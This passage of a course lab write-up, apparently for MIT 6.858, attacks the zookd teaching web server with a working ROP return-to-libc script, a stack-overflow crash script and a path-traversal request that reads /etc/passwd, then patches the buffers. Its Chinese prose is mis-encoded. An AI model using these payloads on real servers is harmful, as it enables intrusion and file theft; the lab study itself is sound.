libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br><br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br><br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br><br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br><br>    <span class="hljs-keyword">return</span> req<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br>    sock.send(get_malicious_request())<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>ç¬”è€…çš„è§£æ³•ç®€å•æ¥è¯´æ˜¯ç”¨ malloc æ¥åˆ†é…ä¸€ä¸ª chunk å¾€ä¸Šé¢å†™å­—ç¬¦ä¸²ï¼Œä¹‹å <code>unlink(chunk)</code> å³å¯</p><p><img src="https://s2.loli.net/2022/12/04/O5euynk9jE3GoH7.png" alt="image.png"></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-libc</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡âˆš</p><p><img src="https://s2.loli.net/2022/12/04/ElDbUBFJ3rqatNW.png" alt="image.png"></p><p>ç„¶åæ˜¯ä¸€ä¸ª <em>Challenge</em> ï¼Œ<strong>åœ¨ä¸ä¾èµ– <code>accidentally()</code> å‡½æ•°çš„æƒ…å†µä¸‹æ„é€  ROP</strong>ï¼Œæç¤ºäº†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ROPgadget æ¥å¯»æ‰¾ gadget ï¼š</p><blockquote><p><em>Challenge! (optional)</em> The <code>accidentally</code> function is a bit artificial. For extra credit, figure out how to perform the return-to-libc attack without relying on that function (delete it and find another way to make your exploit work). Provide your attack in <code>exploit-challenge.py</code>. Also, briefly explain the attack and provide ROP gadgets you use in <code>answers.txt</code>.</p><p>You will need to find another chunk of code to reuse that gives you control over <code>%rdi</code>. You can read through the disassembly (e.g. using <code>objdump</code>) to look for useful ROP gadgets.</p><p>Because of the nature of x86&#x2F;x86-64, you can use another technique to find sequences of instructions that donâ€™t even appear in the disassembly! Instructions are variable-length (from 1 to 15 bytes), and by causing a misaligned parse (by jumping into the middle of an intended instruction), you can cause a sequence of machine code to be misinterpreted. For example, the instruction sequence <code>pop %r15; ret</code> corresponds to the machine code <code>41 5F C3</code>. But instead of executing from the start of this instruction stream, if you jump 1 byte in, the machine code <code>5F C3</code> corresponds to the assembly <code>pop %rdi; ret</code>.</p><p>Automated tools such as <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget.py</a> can assist you in searching for ROP gadgets, even finding gadgets that arise from misaligned parses. The 6.858 VM already has <code>ROPgadget</code> installed.</p><p>You may find it useful to search for ROP gadgets not just in the <code>zookd</code> binary but in other libraries that <code>zookd</code> loads at runtime. To see these libraries, and the addresses at which they are loaded, you can run <strong>( ulimit -s unlimited &amp;&amp; setarch -R ldd zookd-nxstack )</strong>. The <code>ulimit</code> and <code>setarch</code> commands set up the same environment used by <code>clean-env.sh</code>, so that <code>ldd</code> prints the same addresses that will be used at runtime.</p></blockquote><p>ç¬”è€…ä¸€å¼€å§‹çš„æ€è·¯å°±æ˜¯ä¸ç”¨  <code>accidentally()</code> ï¼ˆéå¸¸è«åå…¶å¦™çš„ä¸€ä¸ªå‡½æ•°ï¼‰ï¼Œæ‰€ä»¥ç­‰äºæ˜¯ç›´æ¥é€šè¿‡äº†ï¼ˆç¬‘ï¼‰</p><h2 id="Part-4-Fixing-buffer-overflows-and-other-bugs"><a href="#Part-4-Fixing-buffer-overflows-and-other-bugs" class="headerlink" title="Part 4: Fixing buffer overflows and other bugs"></a>Part 4: Fixing buffer overflows and other bugs</h2><p>è¿™ä¸€å—å°±æ˜¯ä¸¤ä¸ª Exerciseï¼Œ å…ˆçœ‹ Exercise 6ï¼Œè®©æˆ‘ä»¬å¯»æ‰¾ç¨‹åºä¸­çš„å…¶ä»–æ¼æ´ï¼ˆè‡³å°‘ä¸¤ä¸ªï¼Œé™¤äº† <code>zoobar</code> ä¸­çš„ä»¥å¤–ï¼Œé‚£ä¸ªæ˜¯ç•™ç»™æœªæ¥çš„å…¶ä»– labs çš„ï¼‰ï¼š</p><blockquote><p><strong>Exercise 6.</strong> Look through the source code and try to find more vulnerabilities that can allow an attacker to compromise the security of the web server. Describe the attacks you have found in <code>answers.txt</code>, along with an explanation of the limitations of the attack, what an attacker can accomplish, why it works, and how you might go about fixing or preventing it. You should ignore bugs in <code>zoobar</code>â€˜s code. They will be addressed in future labs.</p><p>One approach for finding vulnerabilities is to trace the flow of inputs controlled by the attacker through the server code. At each point that the attackerâ€™s input is used, consider all the possible values the attacker might have provided at that point, and what the attacker can achieve in that manner.</p><p>You should find at least two vulnerabilities for this exercise.</p></blockquote><p><del>æºç å®¡è®¡è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä½†æ˜¯</del>ç¬”è€…å®¡äº†å¤§åŠå¤©å¥½åƒä¹Ÿæ²¡æ‰¾åˆ°é™¤äº†ä¸Šé¢çš„ bug ä»¥å¤–çš„ bugï¼Œè¿˜å¥½åé¢è¿˜æ˜¯æ‰¾åˆ°äº†ä¸€äº›</p><p>é¦–å…ˆæ˜¯åœ¨ <code>process_client()</code> ä¸­å­˜å‚¨è¯·æ±‚ URL çš„é•¿åº¦çš„ä½ç½®å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œå› ä¸ºä¸€æ¬¡æœ€å¤šä¸€è¡Œè¯» 8192 å­—èŠ‚ï¼Œä½†è¿™é‡Œæ˜æ˜¾æ²¡æœ‰é¢„ç•™è¶³å¤Ÿçš„ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<span class="hljs-comment">// åªç•™äº†4096å­—èŠ‚</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span> <span class="hljs-comment">// è¿™é‡Œä¸€æ¬¡æœ€å¤šè¯» 8192 å­—èŠ‚</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br></code></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> * <span class="hljs-number">768</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>æˆåŠŸ crashï¼Œä¸è¿‡è¿™é‡Œå¹¶éå› ä¸ºéæ³•è¿”å›åœ°å€ crashï¼Œè€Œæ˜¯å› ä¸ºæˆ‘ä»¬è¦†å†™æ‰äº†æ ˆä¸Šçš„ <code>errmsg</code> å˜é‡å¯¼è‡´éæ³•å†…å­˜å¼•ç”¨ä»è€Œ crash</p><p><img src="https://s2.loli.net/2022/12/04/t9vq36KXmZOIslJ.png" alt="image.png"></p><p>ç¬¬äºŒä¸ªæ¼æ´æ˜¯åœ¨ <code>http_serve</code> ä¸­å­˜åœ¨ç›®å½•ç©¿è¶Šçš„é—®é¢˜ï¼Œç”±äºæ²¡æœ‰å¯¹è·¯å¾„åšè¿‡æ»¤åŠåˆ¤æ–­ï¼Œè¿™å¯ä»¥è®©æˆ‘ä»¬è®¿é—®åˆ°æœåŠ¡å™¨æ ¹ç›®å½•å¤–çš„æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = http_serve_none;<br>    <span class="hljs-type">char</span> pn[<span class="hljs-number">2048</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><br>    getcwd(pn, <span class="hljs-keyword">sizeof</span>(pn));<br>    setenv(<span class="hljs-string">&quot;DOCUMENT_ROOT&quot;</span>, pn, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(name) + <span class="hljs-built_in">strlen</span>(pn) + <span class="hljs-number">1</span> &gt;= <span class="hljs-keyword">sizeof</span>(pn)) &#123;<br>        http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;Request too long&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">strncat</span>(pn, name, <span class="hljs-keyword">sizeof</span>(pn) - <span class="hljs-built_in">strlen</span>(pn) - <span class="hljs-number">1</span>);<br>    split_path(pn);<br><br>    <span class="hljs-keyword">if</span> (!stat(pn, &amp;st))<br>    &#123;<br>        <span class="hljs-comment">/* executable bits -- run as CGI script */</span><br>        <span class="hljs-keyword">if</span> (valid_cgi_script(&amp;st))<br>            handler = http_serve_executable;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S_ISDIR(st.st_mode))<br>            handler = http_serve_directory;<br>        <span class="hljs-keyword">else</span><br>            handler = http_serve_file;<br>    &#125;<br><br>    handler(fd, pn);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pn)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">if</span> ((filefd = open(pn, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;open %s: %s&quot;</span>, pn, strerror(errno));<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BSD</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (!fstat(filefd, &amp;st))<br>        len = st.st_size;<br>    <span class="hljs-keyword">if</span> (sendfile(fd, filefd, <span class="hljs-number">0</span>, len) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">if</span> (sendfile(filefd, fd, <span class="hljs-number">0</span>, &amp;len, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;sendfile&quot;</span>);<br>    close(filefd);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•å†™ä¸ªè„šæœ¬æµ‹è¯•ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /../../../../etc/passwd&quot;</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;REQUEST_URI: &quot;</span> + <span class="hljs-string">b&quot;index.html&quot;</span>  + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>æˆåŠŸè®¿é—®åˆ° <code>/etc/passwd</code></p><p><img src="https://s2.loli.net/2022/12/04/dlv6JVCk91QhcyW.png" alt="image.png"></p><p>Exercise 6 é‡Œè¯´ <code>You should find at least two vulnerabilities for this exercise.</code> ï¼Œç¬”è€…å·²ç»æ‰¾è¶³ä¸¤ä¸ªï¼Œæ»¡è¶³äº†é¢˜ç›®è¦æ±‚ï¼Œå°±ä¸ç»§ç»­æ‰¾æ›´å¤šçš„äº†ï¼ˆç¬‘ï¼‰<del>ğŸ‘´é€‰æ‹©ç›´æ¥æ‘†å¤§çƒ‚</del></p><p>æ¥ä¸‹æ¥çœ‹æœ€åä¸€ä¸ª Exerciseï¼Œè®©æˆ‘ä»¬è¿›è¡Œæ¼æ´ä¿®å¤ï¼Œä¸»è¦æ˜¯ä¿®æ‰¾åˆ°çš„æ ˆæº¢å‡ºæ¼æ´ï¼š</p><blockquote><p><strong>Exercise 7.</strong> For each buffer overflow vulnerability you have exploited in Exercises 2, 4, and 5, fix the web serverâ€™s code to prevent the vulnerability in the first place. Do not rely on compile-time or runtime mechanisms such as <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">stack canaries</a>, removing <code>-fno-stack-protector</code>, baggy bounds checking, etc.</p><p>Make sure that your code actually stops your exploits from working. Use <strong>make check-fixed</strong> to run your exploits against your modified source code (as opposed to the staff reference binaries from <code>bin.tar.gz</code>). These checks should report FAIL (i.e., exploit no longer works). If they report PASS, this means the exploit still works, and you did not correctly fix the vulnerability.</p><p>Note that your submission should <em>not</em> make changes to the <code>Makefile</code> and other grading scripts. We will use our unmodified version during grading.</p><p>You should also make sure your code still passes all tests using <strong>make check</strong>, which uses the unmodified lab binaries.</p></blockquote><p>ä¸»è¦æ˜¯ä¿®è¿™ä¸¤ä¸ªåœ°æ–¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> value[<span class="hljs-number">8192</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼Œæ”»å‡»å…¨éƒ¨å¤±è´¥ä»£è¡¨æˆåŠŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-fixed</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡âˆš</p><p><img src="https://s2.loli.net/2022/12/04/6XNYjFW7BdPr1Re.png" alt="image.png"></p><p>è‡³æ­¤ï¼Œ Lab1 å…¨éƒ¨å®Œæˆ</p><h1 id="0x02-Lab-2-Privilege-separation-and-server-side-sandboxingï¼ˆuncompletedï¼‰"><a href="#0x02-Lab-2-Privilege-separation-and-server-side-sandboxingï¼ˆuncompletedï¼‰" class="headerlink" title="0x02.Lab 2: Privilege separation and server-side sandboxingï¼ˆuncompletedï¼‰"></a>0x02.Lab 2: Privilege separation and server-side sandboxingï¼ˆuncompletedï¼‰</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>è¿™ä¸€ä¸ª lab ä¸»è¦æ˜¯å…³äº <strong>æƒé™åˆ†ç¦»</strong> ï¼ˆprivilege separationï¼‰ä¸ <strong>æœåŠ¡å™¨ä¾§æ²™ç®±</strong>ï¼ˆserver-side sandboxingï¼‰ï¼Œè¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬ä¸»è¦é€šè¿‡ä¸€ä¸ª MIT ç¼–å†™çš„åä¸º <code>zoobar</code> çš„ python web åº”ç”¨æ¥å®Œæˆï¼Œå…¶ä¸­æƒé™éš”ç¦»çš„ç›®çš„æ˜¯ä¿è¯æ”»å‡»è€…åœ¨ç ´åç¨‹åºçš„ä¸€éƒ¨åˆ†æ—¶ä¸ä¼šç ´ååˆ°ç¨‹åºçš„å¦ä¸€éƒ¨åˆ†ï¼Œè¯¥ lab å°†ä½¿ç”¨ <a href="https://linuxcontainers.org/">Linux containers</a> æ¥å®Œæˆ</p><blockquote><p>æ­¤å‰çš„ lab ä¸­ä½¿ç”¨çš„æ˜¯åœ¨è¯¾ä¸Šè®²è¿‡çš„ OKWS web serverï¼ˆ<del>ğŸ‘´æ²¡å¬è¯¾ï¼Œå¯„äº†</del>ï¼‰</p></blockquote><p>æœ¬ lab ä¸­æˆ‘ä»¬å°†å®Œæˆä¸€ä¸ªæƒé™éš”ç¦»çš„ web serverï¼Œæ£€æŸ¥çœ‹ä½ çš„æ¼æ´ï¼Œå¹¶å°†ç¨‹åºä»£ç åˆ†å‰²æˆéœ€è¦æ›´å°‘æƒé™çš„å†…å®¹å¿«ä»¥æœ€å°åŒ–å•ä¸ªæ¼æ´çš„å½±å“ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å°†æ‰©å±• Zoobar ä»¥ä½¿å…¶æ”¯æŒ  <em>å¯æ‰§è¡Œé…ç½®æ–‡ä»¶</em>  ï¼ˆexecutable profilesï¼‰ï¼Œè¿™å…è®¸æˆ‘ä»¬ä½¿ç”¨ python æ¥ä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œå¹¶å®Œæˆä¸åŒç”¨æˆ·é…ç½®æ–‡ä»¶çš„éš”ç¦»ï¼Œè¿™å…è®¸ç”¨æˆ·åœ¨å…¶é…ç½®æ–‡ä»¶ä¸­å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š</p><ul><li>ä¸€ä¸ªæŒ‰ç”¨æˆ·åæ¬¢è¿è®¿å®¢çš„ profile</li><li>ä¸€ä¸ªè®°å½•æœ€åå‡ ä½è®¿å®¢çš„ profile</li><li>ä¸€ä¸ªä¸ºæ¯ä½è®¿å®¢æä¾› zoobar çš„ profileï¼ˆé™åˆ¶ä¸ºæ¯åˆ†é’Ÿ1ä½ï¼‰</li></ul><p>è¿™éœ€è¦æ²™ç®±åŒ–æœåŠ¡å™¨ä¸Šçš„ profile code ä»è€Œé¿å…ä»»æ„ä»£ç æ‰§è¡Œæˆ–ä»»æ„æ–‡ä»¶è®¿é—®ï¼Œæ­¤å¤–ï¼Œè¿™äº›ä»£ç æˆ–è®¸éœ€è¦ä¿æŒè®°å½•ä¸€äº›æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œæˆ–æ˜¯è®¿é—® zoobar æ•°æ®åº“ä»¥æ­£ç¡®æ‰§è¡Œï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åä¸ºåº“çš„è¿œç¨‹è¿‡ç¨‹ä¸ lab æä¾›çš„ä¸€äº›ä»£ç æ¥æ²™ç®±åŒ–å¯æ‰§è¡Œé…ç½®æ–‡ä»¶</p><blockquote><p>å®éªŒæ‰‹å†ŒåŸæ–‡å°±æŒºä¹±ä¸ƒå…«ç³Ÿçš„ï¼ŒğŸ‘´æ„£æ˜¯æ²¡å’‹çœ‹æ˜ç™½ï¼Œ<del>ä¹Ÿå¯èƒ½æ˜¯ğŸ‘´çš„è‹±æ–‡æ°´å¹³å¤ªåƒåœ¾äº†</del></p></blockquote><p>é‚£ä¹ˆæ¥ä¸‹æ¥é¦–å…ˆè¿˜æ˜¯æŠŠä»£ç åˆ‡åˆ° lab2 çš„åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add answers.txt exploit-*.py http.c zookd.c [and any other new files...]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&quot;lab1 solution completed&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab1</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿˜æ˜¯å…ˆ <code>make</code> æ£€æŸ¥ä¸€ä¸‹ï¼Œæ²¡æŠ¥é”™å°± ğŸ†—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookfs.o zookfs.c<br>cc -m64 -g 